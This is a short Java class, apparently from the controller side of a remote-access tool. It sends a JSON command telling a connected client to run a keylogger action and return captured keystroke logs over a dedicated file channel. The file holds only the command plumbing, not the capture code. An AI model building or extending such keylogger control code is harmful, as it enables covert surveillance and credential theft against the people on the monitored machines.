package TableUtils.KeyLogger.Events;

import Server.BytesChannel;
import Packets.Identificators.Category;
import Server.Client;
import TableUtils.KeyLogger.Constants.KeyLog;
import Utilities.AbstractDialogCreator;
import Utilities.AbstractEventGUI;
import org.json.JSONObject;

import java.io.IOException;

public class KeyloggerEvent extends AbstractEventGUI<AbstractDialogCreator> {

    private final Client client;
    private final KeyLog keyLog;

    public KeyloggerEvent(Client client, KeyLog keyLog) {
        super(null);
        this.client = client;
        this.keyLog = keyLog;
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = client.createFileChannel(Category.KEYLOGGER_LOGS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", keyLog.toString());
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            client.sendString(jsonObject.toString());
        } catch (IOException e) {
            handleGuiError();
        }
    }
}
